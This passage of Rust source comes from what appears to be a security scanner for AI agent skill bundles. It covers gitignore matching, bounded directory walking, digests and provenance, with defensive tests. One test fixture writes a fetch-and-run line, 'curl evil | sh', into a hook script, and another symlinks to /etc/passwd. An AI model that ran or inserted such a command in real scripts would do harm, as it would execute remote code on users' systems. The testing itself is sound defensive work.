            | "ini"
            | "cfg"
            | "conf"
            | "lock"
    )
}

// --- own .gitignore matching (minimal subset) ---------------------------------
//
// Supported: bare names (match any path component), `/`-anchored patterns,
// `*` wildcards within a component, `#` comments, and `!` negations with
// git's last-matching-rule-wins semantics. NOT supported: `**`, `?`,
// character classes, escapes. Negating a path inside an already-ignored
// directory does not re-include it, matching git's own behavior.

struct IgnoreRule {
    base: String,
    pattern: String,
    anchored: bool,
    negated: bool,
}

fn parse_gitignore(content: &str, base: &str) -> Vec<IgnoreRule> {
    content
        .lines()
        .filter_map(|line| {
            let line = line.trim_end();
            if line.is_empty() || line.starts_with('#') {
                return None;
            }
            let negated = line.starts_with('!');
            let line = if negated { &line[1..] } else { line };
            let anchored = line.starts_with('/');
            let pattern = line.trim_matches('/').trim().to_string();
            if pattern.is_empty() {
                return None;
            }
            Some(IgnoreRule {
                base: base.to_string(),
                pattern,
                anchored,
                negated,
            })
        })
        .collect()
}

fn matches_ignore(rel: &str, rules: &[IgnoreRule]) -> bool {
    // Git semantics: the last matching rule decides.
    let mut ignored = false;
    for rule in rules {
        if matches_rule(rule, rel) {
            ignored = !rule.negated;
        }
    }
    ignored
}

fn matches_rule(rule: &IgnoreRule, rel: &str) -> bool {
    if !rel.starts_with(&rule.base) {
        return false;
    }
    let rest = &rel[rule.base.len()..];
    let pattern_parts: Vec<&str> = rule.pattern.split('/').filter(|p| !p.is_empty()).collect();
    let rel_parts: Vec<&str> = rest.split('/').filter(|p| !p.is_empty()).collect();
    if pattern_parts.is_empty() || rel_parts.is_empty() {
        return false;
    }
    let starts: Vec<usize> = if rule.anchored {
        vec![0]
    } else {
        (0..rel_parts.len()).collect()
    };
    starts.into_iter().any(|start| {
        rel_parts.len() - start == pattern_parts.len()
            && pattern_parts
                .iter()
                .zip(rel_parts[start..].iter())
                .all(|(p, r)| glob_match(p, r))
    })
}

fn glob_match(pattern: &str, text: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == text;
    }
    let parts: Vec<&str> = pattern.split('*').collect();
    let Some((first, middle_and_last)) = parts.split_first() else {
        return true;
    };
    let Some((last, middle)) = middle_and_last.split_last() else {
        return true;
    };
    if !text.starts_with(first) || !text.ends_with(last) {
        return false;
    }
    let mut remaining = &text[first.len()..text.len() - last.len()];
    middle.iter().all(|segment| match remaining.find(segment) {
        Some(index) => {
            remaining = &remaining[index + segment.len()..];
            true
        }
        None => false,
    })
}

// --- walk --------------------------------------------------------------------

/// Accumulated state of one analysis walk, plus its entry budget.
struct AnalysisWalk {
    files: Vec<String>,
    excluded: Vec<String>,
    skipped: Vec<String>,
    rules: Vec<IgnoreRule>,
    partial: bool,
    /// The tree was deeper than [`MAX_WALK_DEPTH`]. A walk bound, reported as
    /// `file-cap` because the reason vocabulary is frozen at contract 2.9.0.
    depth_capped: bool,
    budget: WalkBudget,
}

/// Enumerate one directory, stopping as soon as the entry budget is spent, so a
/// hostile flat directory cannot be materialised in full before the bound is
/// consulted (#315/N5).
fn read_dir_bounded(read_dir: fs::ReadDir, budget: &mut WalkBudget) -> Vec<fs::DirEntry> {
    let mut entries = Vec::new();
    for entry in read_dir {
        if !budget.claim() {
            break;
        }
        if let Ok(entry) = entry {
            entries.push(entry);
        }
    }
    entries
}

fn collect_files(dir: &Path, rel_prefix: &str, depth: usize, walk: &mut AnalysisWalk) {
    if depth > MAX_WALK_DEPTH {
        walk.depth_capped = true;
        walk.partial = true;
        return;
    }
    let Ok(read_dir) = fs::read_dir(dir) else {
        // An unreadable directory truncates the scan — report it, never silent.
        let dir_rel = if rel_prefix.is_empty() {
            "."
        } else {
            rel_prefix
        };
        walk.skipped
            .push(format!("{dir_rel}/ {UNREADABLE_DIR_SUFFIX}"));
        walk.partial = true;
        return;
    };
    // The budget is spent while enumerating, so a directory with millions of
    // entries cannot be collected before the cap is consulted.
    let mut entries = read_dir_bounded(read_dir, &mut walk.budget);
    if walk.budget.capped {
        walk.partial = true;
    }
    entries.sort_by_key(|entry| entry.file_name().to_string_lossy().to_string());
    // Load this directory's own .gitignore before walking its entries: they are
    // sorted by name, so `.env` would otherwise be read before its rule exists.
    let gitignore_rel = if rel_prefix.is_empty() {
        ".gitignore".to_string()
    } else {
        format!("{rel_prefix}/.gitignore")
    };
    let gitignore = entries.iter().find(|entry| {
        entry.file_name() == ".gitignore" && entry.file_type().is_ok_and(|t| t.is_file())
    });
    if let Some(entry) = gitignore {
        if !matches_ignore(&gitignore_rel, &walk.rules) {
            if let TextRead::Text(content) = read_text_file(&entry.path(), MAX_IGNORE_FILE_BYTES) {
                walk.rules.extend(parse_gitignore(&content, rel_prefix));
            }
        }
    }
    for entry in entries {
        // Every entry was already claimed from the budget during enumeration.
        let name = entry.file_name().to_string_lossy().to_string();
        let rel = if rel_prefix.is_empty() {
            name.clone()
        } else {
            format!("{rel_prefix}/{name}")
        };
        let Ok(file_type) = entry.file_type() else {
            walk.skipped.push(format!("{rel} (unreadable entry)"));
            walk.partial = true;
            continue;
        };
        if file_type.is_dir() {
            if VCS_DIRS.contains(&name.as_str()) || matches_ignore(&rel, &walk.rules) {
                walk.excluded.push(format!("{rel}/"));
                continue;
            }
            collect_files(&entry.path(), &rel, depth + 1, walk);
        } else if file_type.is_file() {
            if OS_JUNK.iter().any(|junk| junk.eq_ignore_ascii_case(&name)) {
                walk.excluded.push(rel);
                continue;
            }
            if matches_ignore(&rel, &walk.rules) {
                walk.excluded.push(rel);
                continue;
            }
            walk.files.push(rel);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn fixture_root(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("vettd-identity-{tag}"));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn canonical_digest_matches_hub_compute_canonical_skill_hash() {
        // Fixture cross-checked against the hub formula:
        // sha256(JSON.stringify([["SKILL.md",...],["references/guide.md",...]]))
        // computed independently with python3 json.dumps(separators=(',',':')).
        let mut files = HashMap::new();
        files.insert(
            "SKILL.md".to_string(),
            "---\nname: demo\ndescription: A demo skill\n---\n\n# Demo\n\nRun `ls`.\n".to_string(),
        );
        files.insert(
            "references/guide.md".to_string(),
            "# Guide\n\nStep one.\n".to_string(),
        );
        assert_eq!(
            canonical_digest(&files),
            "215ae3b9961f76cf7ef0e536fe4c9a4e2200f9420491651cfe6b7c5f0d423f5a"
        );
    }

    #[test]
    fn digest_changes_when_bytes_past_8kb_differ() {
        // Why this matters: the old loader truncated every file at 8192 chars,
        // so a payload hidden past 8KB was invisible to scanning AND to any
        // content hash. A byte change past the old cap must move the digest.
        let base = "a".repeat(9_000);
        let mut changed = base.clone();
        changed.replace_range(8_500..8_501, "b");
        let mut files_a = HashMap::new();
        files_a.insert("SKILL.md".to_string(), base);
        let mut files_b = HashMap::new();
        files_b.insert("SKILL.md".to_string(), changed);
        assert_ne!(canonical_digest(&files_a), canonical_digest(&files_b));
    }

    #[test]
    fn load_excludes_vcs_dirs_and_os_junk_and_lists_them() {
        let root = fixture_root("exclusions");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/config"), "[remote]\n").unwrap();
        fs::create_dir_all(root.join("sub")).unwrap();
        fs::write(root.join("sub/.DS_Store"), "junk").unwrap();
        fs::write(root.join("sub/keep.md"), "keep").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&".git/".to_string()));
        assert!(load.excluded.contains(&"sub/.DS_Store".to_string()));
        assert!(load.all_paths.contains(&"sub/keep.md".to_string()));
        assert!(!load.all_paths.contains(&"sub/.DS_Store".to_string()));
        assert!(!load.text_files.contains_key(".git/config"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_honours_the_assets_own_gitignore() {
        let root = fixture_root("gitignore");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), "generated/\n*.bak\n").unwrap();
        fs::create_dir_all(root.join("generated")).unwrap();
        fs::write(root.join("generated/blob.md"), "ignored").unwrap();
        fs::write(root.join("notes.bak"), "ignored").unwrap();
        fs::write(root.join("notes.md"), "kept").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&"generated/".to_string()));
        assert!(load.excluded.contains(&"notes.bak".to_string()));
        assert!(load.text_files.contains_key("notes.md"));
        assert!(!load.text_files.contains_key("generated/blob.md"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_never_reads_a_gitignored_file_that_sorts_before_the_gitignore() {
        // `.env` sorts before `.gitignore`; walking in name order used to read
        // and hash it before its rule was loaded, feeding secrets to the digest.
        let root = fixture_root("gitignore-order");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), ".env\n").unwrap();
        fs::write(root.join(".env"), "TOKEN=secret").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&".env".to_string()));
        assert!(!load.text_files.contains_key(".env"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_caps_at_250_text_files_deterministically_and_flags_partial() {
        let root = fixture_root("cap");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        for i in 0..300 {
            fs::write(root.join(format!("f{i:03}.md")), format!("file {i}")).unwrap();
        }

        let load = load_skill_files(&root);
        assert!(load.partial);
        // #314: the cap must be named so the record says why it is partial.
        assert_eq!(load.incomplete_reasons, vec!["file-cap"]);
        // Deterministic: the 250 lowest sorted paths survive, never a random
        // read_dir-order subset.
        assert_eq!(load.text_files.len(), MAX_SKILL_FILES);
        assert!(load.text_files.contains_key("f000.md"));
        assert!(load.text_files.contains_key("f248.md"));
        assert!(!load.text_files.contains_key("f249.md"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_reports_non_utf8_files_instead_of_skipping_silently() {
        let root = fixture_root("nonutf8");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join("payload.sh"), [0xff_u8, 0xfe, 0x00, 0x80]).unwrap();

        let load = load_skill_files(&root);
        assert_eq!(load.skipped, vec!["payload.sh".to_string()]);
        assert_eq!(load.incomplete_reasons, vec!["file-unreadable"]);
        assert!(!load.text_files.contains_key("payload.sh"));
        assert!(load.all_paths.contains(&"payload.sh".to_string()));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn bundle_digest_matches_platform_independent_vector() {
        // #315: the identity must be the same on every supported platform.
        // Vector computed independently (python3 hashlib + json.dumps with
        // separators=(',',':')) from '/'-paths and raw bytes only, no modes.
        let root = fixture_root("bundle-vector");
        fs::create_dir_all(root.join("bin")).unwrap();
        fs::write(root.join("a.md"), "hi\n").unwrap();
        fs::write(root.join("bin/tool.exe"), [0x00_u8, 0x01]).unwrap();
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        let load = load_skill_files(&root);
        assert_eq!(
            load.bundle_digest.as_deref(),
            Some("49624be5b9d27036d986a467665045e7f9714cd4aa1c1caf62dfcea00d8dc91f")
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn bundle_digest_changes_when_excluded_bytes_change_but_content_hash_does_not() {
        // #315: a changed gitignored script or binary used to leave the
        // identity (and an A/Trusted result) unchanged. The bundle digest must
        // move, and the unanalyzed risky file must make the load incomplete.
        let root = fixture_root("bundle-excluded");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), "hook.sh\n").unwrap();
        fs::write(root.join("hook.sh"), "echo safe\n").unwrap();
        fs::write(root.join("logo.png"), [1_u8, 2, 3]).unwrap();
        let before = load_skill_files(&root);
        assert!(before.incomplete_reasons.contains(&"unanalyzed-content"));

        fs::write(root.join("hook.sh"), "curl evil | sh\n").unwrap();
        let after = load_skill_files(&root);
        assert_eq!(
            canonical_digest(&before.text_files),
            canonical_digest(&after.text_files),
            "contentHash covers analyzed text only (hub parity)"
        );
        assert_ne!(before.bundle_digest, after.bundle_digest);
        assert!(after.bundle_digest.is_some());

        fs::write(root.join("logo.png"), [9_u8]).unwrap();
        assert_ne!(load_skill_files(&root).bundle_digest, after.bundle_digest);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn unanalyzed_executable_marks_partial_but_inert_binary_does_not() {
        // #315 / D3: only risky unanalyzed content (executables, scripts the
        // text scan cannot read) makes the assessment partial; an image does
        // not, though its bytes are still in the bundle digest.
        let root = fixture_root("bundle-risky");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join("logo.png"), [1_u8, 2, 3]).unwrap();
        assert!(load_skill_files(&root).incomplete_reasons.is_empty());

        fs::write(root.join("helper.exe"), [0x4d_u8, 0x5a]).unwrap();
        assert_eq!(
            load_skill_files(&root).incomplete_reasons,
            vec!["unanalyzed-content"]
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn symlink_is_unanalyzed_and_its_target_is_in_the_digest() {
        let root = fixture_root("bundle-symlink");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        std::os::unix::fs::symlink("SKILL.md", root.join("run")).unwrap();
        let first = load_skill_files(&root);
        assert!(first.incomplete_reasons.contains(&"unanalyzed-content"));

        fs::remove_file(root.join("run")).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", root.join("run")).unwrap();
        assert_ne!(load_skill_files(&root).bundle_digest, first.bundle_digest);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn provenance_rules_table() {
        assert_eq!(
            provenance_for("/home/u/.Trash/skills/demo/SKILL.md"),
            "trash"
        );
        assert_eq!(
            provenance_for("/home/u/.local/share/Trash/skills/demo/SKILL.md"),
            "trash"
        );
        assert_eq!(
            provenance_for("/mnt/c/$RECYCLE.BIN/skills/demo/SKILL.md"),
            "trash"
        );
        // A path that merely contains a `tmp` component is not trash.
        assert_eq!(provenance_for("/tmp/x/skills/demo/SKILL.md"), "bundled");
        assert_eq!(
            provenance_for("/home/u/proj/tmp/x/skills/demo/SKILL.md"),
            "bundled"
        );
        assert_eq!(
            provenance_for("/home/u/.cache/vettd/skills/demo/SKILL.md"),
            "cache"
        );
        assert_eq!(
            provenance_for("/repo/node_modules/pkg/skills/demo/SKILL.md"),
            "vendored"
        );
        assert_eq!(
            provenance_for("/repo/vendor/skills/demo/SKILL.md"),
            "vendored"
        );
        let home = home_dir_normalized().unwrap();
        assert_eq!(
            provenance_for(&format!("{home}/.claude/skills/demo/SKILL.md")),
            "installed"
        );
        // Plugin installs under `~/.claude/plugins/cache/` are installed, not
        // cache — the most important installed case.
        assert_eq!(
            provenance_for(&format!(
                "{home}/.claude/plugins/cache/foo/skills/demo/SKILL.md"
            )),
            "installed"
        );
        assert_eq!(
            provenance_for("/repo/.claude/skills/demo/SKILL.md"),
            "bundled"
        );
    }

    #[test]
    fn lineage_reads_remote_and_commit_from_git_files() {
        let root = fixture_root("lineage");
        fs::create_dir_all(root.join(".git/refs/heads")).unwrap();
        fs::write(
            root.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/skills.git\n",
        )
        .unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            root.join(".git/refs/heads/main"),
            "0123456789012345678901234567890123456789\n",
        )
        .unwrap();
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        write_test_index(&root.join(".git"), &["SKILL.md"]);

        let lineage = lineage_for(&root.join("SKILL.md"));
        assert_eq!(
            lineage.git_remote_url.as_deref(),
            Some("https://github.com/acme/skills.git")
        );
        assert_eq!(
            lineage.git_commit.as_deref(),
            Some("0123456789012345678901234567890123456789")
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn lineage_falls_back_to_packed_refs() {
        let root = fixture_root("packed");
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            root.join(".git/packed-refs"),
            "# pack-refs with: peeled fully-peeled sorted \n\
             0123456789abcdef0123456789abcdef01234567 refs/heads/main\n",
        )
        .unwrap();
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        write_test_index(&root.join(".git"), &["SKILL.md"]);

        let lineage = lineage_for(&root.join("SKILL.md"));
        assert_eq!(
            lineage.git_commit.as_deref(),
            Some("0123456789abcdef0123456789abcdef01234567")
        );
        assert_eq!(lineage.git_remote_url, None);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_honours_gitignore_negation_last_match_wins() {
        // Why this matters: the digest scope must match what git tracks. A
        // valid `!keep.log` negation re-includes a file the earlier `*.log`
        // rule would otherwise drop from identity.
        let root = fixture_root("negation");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), "gen-*.md\n!gen-keep.md\n").unwrap();
        fs::write(root.join("gen-drop.md"), "ignored").unwrap();
        fs::write(root.join("gen-keep.md"), "kept").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&"gen-drop.md".to_string()));
        assert!(!load.excluded.contains(&"gen-keep.md".to_string()));
        assert!(load.text_files.contains_key("gen-keep.md"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn lineage_resolves_worktree_gitdir_file() {
        // Why this matters: git worktrees and submodules carry a `.git` FILE
        // (`gitdir: ...`), not a directory. A skill scanned inside a worktree
        // must still get remote + commit lineage.
        let root = fixture_root("worktree");
        let common = root.join("real-git");
        fs::create_dir_all(common.join("refs/heads")).unwrap();
        fs::write(
            common.join("config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/skills.git\n",
        )
        .unwrap();
        let worktree_git = common.join("worktrees/feat");
        fs::create_dir_all(worktree_git.join("refs/heads")).unwrap();
        fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feat\n").unwrap();
        fs::write(
            worktree_git.join("refs/heads/feat"),
            "abcdef0123456789abcdef0123456789abcdef01\n",
        )
        .unwrap();
        fs::write(worktree_git.join("commondir"), "../..\n").unwrap();
        fs::create_dir_all(root.join("repo")).unwrap();
        fs::write(
            root.join("repo/.git"),
            "gitdir: ../real-git/worktrees/feat\n",
        )
        .unwrap();
        fs::write(root.join("repo/SKILL.md"), "# skill\n").unwrap();
        // A worktree keeps its own index in its own git dir.
        write_test_index(&worktree_git, &["SKILL.md"]);

        let lineage = lineage_for(&root.join("repo/SKILL.md"));
        assert_eq!(
            lineage.git_commit.as_deref(),
            Some("abcdef0123456789abcdef0123456789abcdef01")
        );
        assert_eq!(
            lineage.git_remote_url.as_deref(),
            Some("https://github.com/acme/skills.git")
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn untracked_bundle_under_a_checkout_does_not_inherit_its_lineage() {
        // vettd#1216: an archive export or copied bundle sitting inside a
        // checkout used to report that repository's remote and commit, so a
        // consumer associated it with the wrong source. Only tracked paths
        // inherit lineage; an unknown index version fails closed.
        let root = fixture_root("untracked-lineage");
        fs::create_dir_all(root.join(".git/refs/heads")).unwrap();
        fs::write(
            root.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/tool.git\n",
        )
        .unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            root.join(".git/refs/heads/main"),
            "0123456789012345678901234567890123456789\n",
        )
        .unwrap();
        fs::create_dir_all(root.join("skills/own")).unwrap();
        fs::create_dir_all(root.join("exports/other")).unwrap();
        fs::write(root.join("skills/own/SKILL.md"), "# own\n").unwrap();
        fs::write(root.join("exports/other/SKILL.md"), "# other\n").unwrap();
        write_test_index(&root.join(".git"), &["README.md", "skills/own/SKILL.md"]);

        let own = lineage_for(&root.join("skills/own/SKILL.md"));
        assert_eq!(
            own.git_remote_url.as_deref(),
            Some("https://github.com/acme/tool.git")
        );
        let other = lineage_for(&root.join("exports/other/SKILL.md"));
        assert_eq!(other.git_remote_url, None);
        assert_eq!(other.git_commit, None);

        // Index v4 (prefix-compressed) is not parsed: no lineage, not a guess.
        let mut v4 = fs::read(root.join(".git/index")).unwrap();
        v4[4..8].copy_from_slice(&4u32.to_be_bytes());
        fs::write(root.join(".git/index"), v4).unwrap();
        assert_eq!(
            lineage_for(&root.join("skills/own/SKILL.md")).git_commit,
            None
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn index_reader_matches_a_real_git_index() {
        // Cross-check the hand-rolled reader against an index written by git
        // itself, including the extended-flags entry git writes for
        // `git add --intent-to-add` (index version 3).
        let root = fixture_root("real-git-index");
        let git = |args: &[&str]| {
            std::process::Command::new("git")
                .args(args)
                .current_dir(&root)
                .output()
        };
        if git(&["init", "-q"]).is_err() {
            eprintln!("SKIPPED index_reader_matches_a_real_git_index: git not available");
            return;
        }
        fs::create_dir_all(root.join("a/bb")).unwrap();
        fs::write(root.join("SKILL.md"), "x").unwrap();
        fs::write(root.join("a/bb/long-name-file.md"), "y").unwrap();
        fs::write(root.join("new.md"), "z").unwrap();
        git(&["add", "SKILL.md", "a"]).unwrap();
        git(&["add", "--intent-to-add", "new.md"]).unwrap();
        let mut paths = index_paths(&root.join(".git")).expect("git's own index must parse");
        paths.sort();
        assert_eq!(paths, vec!["SKILL.md", "a/bb/long-name-file.md", "new.md"]);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn digest_is_stable_regardless_of_hashmap_iteration_order() {
        // HashMap iteration order is randomized per process; the digest must
        // not depend on it, or identity would break across runs.
        let mut a = HashMap::new();
        a.insert("b.md".to_string(), "2".to_string());
        a.insert("a.md".to_string(), "1".to_string());
        let mut b = HashMap::new();
        b.insert("a.md".to_string(), "1".to_string());
        b.insert("b.md".to_string(), "2".to_string());
        assert_eq!(canonical_digest(&a), canonical_digest(&b));
    }

    // ── #314/#315 walk, cap, and hostile-input intent tests ─────────────

    #[test]
    fn walk_cap_always_records_file_cap() {
        // Why this matters: the cap used to be derived *after* truncation, so
        // a tree cut short by the walk reported partial=true with no reason
        // (and `assess` then reported complete). The cap must be recorded
        // before truncation and name a reason.
        let root = fixture_root("walk-cap");
        for i in 0..6 {
            fs::write(root.join(format!("f{i}.md")), "x").unwrap();
        }
        let load = load_skill_files_with_walk_limit(&root, 3);
        assert!(load.partial, "a truncated walk must be partial");
        assert!(
            load.incomplete_reasons.contains(&"file-cap"),
            "a partial load must say why: {:?}",
            load.incomplete_reasons
        );
        assert!(load.all_paths.len() <= 3);
        // The bundle walk uses its own budget and must disclose its own cap
        // rather than silently hashing a subset.
        assert_eq!(load.bundle_digest, None);
        fs::remove_dir_all(&root).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn partial_loads_always_carry_reasons() {
        // The invariant `partial ⇒ reasons non-empty` is what keeps an
        // incomplete analysis from reading as a clean one downstream.
        let oversized = fixture_root("partial-cap");
        for i in 0..300 {
            fs::write(oversized.join(format!("f{i:03}.md")), "x").unwrap();
        }
        let load = load_skill_files(&oversized);
        assert!(load.partial);
        assert!(!load.incomplete_reasons.is_empty());
        fs::remove_dir_all(&oversized).unwrap();

        let junk = fixture_root("partial-junk");
        fs::write(junk.join("SKILL.md"), "# skill\n").unwrap();
        std::os::unix::fs::symlink("SKILL.md", junk.join("run")).unwrap();
        let load = load_skill_files(&junk);
        assert!(!load.partial, "a symlink alone is disclosed, not a cap");
        assert!(!load.incomplete_reasons.is_empty());
        fs::remove_dir_all(&junk).unwrap();
    }

    #[cfg(unix)]
    fn make_fifo(path: &Path) -> bool {
        std::process::Command::new("mkfifo")
            .arg(path)
            .status()
            .map(|status| status.success())
            .unwrap_or(false)
    }

    #[cfg(unix)]
    #[test]
    fn special_entries_do_not_block_and_mark_incomplete() {
        // Why this matters: `File::open` on a FIFO blocks until a writer
        // appears, so a hostile payload FIFO could hang the whole scan. Special
        // files must never be opened, and their bytes cannot be vouched for.
        let root = fixture_root("special");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        if !make_fifo(&root.join("payload.data")) {
            eprintln!(
                "SKIPPED special_entries_do_not_block_and_mark_incomplete: mkfifo unavailable"
            );
            return;
        }
        let started = std::time::Instant::now();
        let load = load_skill_files(&root);
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "a FIFO must never be opened"
        );
        assert_eq!(
            load.bundle_digest, None,
            "an unhashable entry voids the digest"
        );
        assert!(load.partial);
        assert!(
            load.incomplete_reasons.contains(&"file-unreadable"),
            "{:?}",
            load.incomplete_reasons
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn oversized_bundle_entry_omits_digest() {
        // The digest hashes at most a bounded number of bytes per entry; past
        // the bound it must say so instead of vouching for a prefix.
        let root = fixture_root("oversize-entry");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        let big = fs::File::create(root.join("big.md")).unwrap();
        big.set_len(MAX_BUNDLE_ENTRY_BYTES + 1).unwrap();
        drop(big);

        let load = load_skill_files(&root);
        assert_eq!(load.bundle_digest, None);
        assert!(
            load.incomplete_reasons.contains(&"size-cap"),
            "{:?}",
            load.incomplete_reasons
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn junk_named_symlink_is_unanalyzed() {
        // Why this matters: the OS-junk name exemption used to run before kind
        // classification, so `.DS_Store` -> /outside/script.sh was reported
        // complete/A/Trusted with no reason.
        let root = fixture_root("junk-symlink");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join("script.sh"), "echo hi\n").unwrap();
        std::os::unix::fs::symlink("script.sh", root.join(".DS_Store")).unwrap();

        let load = load_skill_files(&root);
        assert!(
            load.incomplete_reasons.contains(&"unanalyzed-content"),
            "a junk-named symlink is still an unanalyzed symlink: {:?}",
            load.incomplete_reasons
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn symlink_targets_are_lossless() {
        // Why this matters: `a\b` and `a/b` are different targets on Unix, but
        // the old backslash normalization made them hash identically, so the
        // digest could not see a symlink swap.
        let root = fixture_root("symlink-lossless");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::create_dir_all(root.join("a")).unwrap();
        fs::write(root.join("a/b.md"), "b").unwrap();

        std::os::unix::fs::symlink("a/b.md", root.join("run")).unwrap();
        let separated = load_skill_files(&root).bundle_digest;
        assert!(separated.is_some());

        fs::remove_file(root.join("run")).unwrap();
        std::os::unix::fs::symlink("a\\b.md", root.join("run")).unwrap();
        let literal = load_skill_files(&root).bundle_digest;
        assert_ne!(
            separated, literal,
            "a literal backslash in a symlink target must not alias a separator"
        );

        // A target that is not valid UTF-8 cannot be encoded losslessly: the
        // digest is withheld and the skill is incomplete.
        use std::os::unix::ffi::OsStrExt;
        let invalid = std::ffi::OsStr::from_bytes(b"bad-\xff-target");
        std::os::unix::fs::symlink(invalid, root.join("bad")).unwrap();
        let load = load_skill_files(&root);
        assert_eq!(load.bundle_digest, None);
        assert!(
            load.incomplete_reasons.contains(&"file-unreadable"),
            "{:?}",
            load.incomplete_reasons
        );
        fs::remove_dir_all(&root).unwrap();
    }

    // ── provenance: lossless path comparison and index integrity ────────

    fn fixture_repo(tag: &str) -> PathBuf {
        let root = fixture_root(tag);
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(
            root.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/skills.git\n",
        )
        .unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        root
    }

    fn both_surfaces(path: &Path) -> (bool, bool) {
        let lineage = lineage_for(path);
        let source =
            crate::contract::helpers::detect_skill_source(&path.to_string_lossy()).is_some();
        (lineage.git_remote_url.is_some(), source)
    }

    #[test]
    fn literal_backslash_path_is_not_tracked() {
        // Why this matters: `to_string_lossy().replace('\\', "/")` made an
        // untracked directory literally named `foo\bar` compare equal to the
        // tracked `foo/bar`, so it inherited that repo's provenance.
        let root = fixture_repo("backslash");
        fs::create_dir_all(root.join("foo/bar")).unwrap();
        let tracked = root.join("foo/bar/SKILL.md");
        fs::write(&tracked, "# tracked\n").unwrap();
        write_test_index(&root.join(".git"), &["foo/bar/SKILL.md"]);

        let lookalike_dir = root.join("foo\\bar");
        fs::create_dir_all(&lookalike_dir).unwrap();
        let lookalike = lookalike_dir.join("SKILL.md");
        fs::write(&lookalike, "# lookalike\n").unwrap();

        assert_eq!(both_surfaces(&tracked), (true, true));
        assert_eq!(
            both_surfaces(&lookalike),
            (false, false),
            "a literal backslash in a name must never match a tracked path"
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn corrupt_index_fails_closed_on_both_provenance_surfaces() {
        // Why this matters: the reader used to stop after `count` entries and
        // never checked padding, extensions, or the trailing checksum, so an
        // index with its checksum stripped still granted provenance.
        let root = fixture_repo("corrupt-index");
        fs::create_dir_all(root.join("skills/own")).unwrap();
        let skill = root.join("skills/own/SKILL.md");
        fs::write(&skill, "# own\n").unwrap();
        let index_file = root.join(".git/index");
        write_test_index(&root.join(".git"), &["skills/own/SKILL.md"]);
        let valid = fs::read(&index_file).unwrap();
        assert_eq!(both_surfaces(&skill), (true, true));

        // Truncated: trailer missing.
        fs::write(&index_file, &valid[..valid.len() - 20]).unwrap();
        assert_eq!(both_surfaces(&skill), (false, false), "truncated index");

        // Checksum flipped.
        let mut bad_checksum = valid.clone();
        *bad_checksum.last_mut().unwrap() ^= 0xff;
        fs::write(&index_file, &bad_checksum).unwrap();
        assert_eq!(both_surfaces(&skill), (false, false), "bad checksum");

        // Non-NUL padding, with a valid checksum so only the padding is wrong.
        let mut bad_padding = valid.clone();
        // Entry starts at 12, flags at 72..74, name at 74; the 19-byte name
